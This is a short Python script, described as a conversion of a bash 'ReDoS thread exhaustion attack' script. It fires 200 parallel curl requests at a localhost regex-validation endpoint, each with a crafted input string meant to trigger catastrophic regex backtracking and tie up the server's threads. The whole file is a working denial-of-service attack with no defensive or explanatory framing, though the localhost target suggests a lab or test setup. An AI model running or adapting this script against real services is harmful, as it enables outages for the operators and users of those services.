#!/usr/bin/env python3
"""
Direct Python conversion of the bash ReDoS attack script
"""

import subprocess
import time
import os
import sys

def main():
    print("Launching ReDoS thread exhaustion attack...")
    
    processes = []
    
    for i in range(1, 201):  # 1 to 200
        # Start curl process in background
        cmd = [
            'curl', '-s', 
            'http://localhost:5000/api/regex/validate?input=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaac'
        ]

        
        try:
            process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            processes.append(process)
        except FileNotFoundError:
            print("Error: curl command not found. Please install curl.")
            sys.exit(1)
        
        if i % 10 == 0:
            print(f"Launched {i} requests...")
            time.sleep(0.1)
    
    print("All requests launched. Waiting for completion...")
    
    # Wait for all processes to complete
    for process in processes:
        process.wait()
    
    print("Attack completed.")

if __name__ == "__main__":
    main()
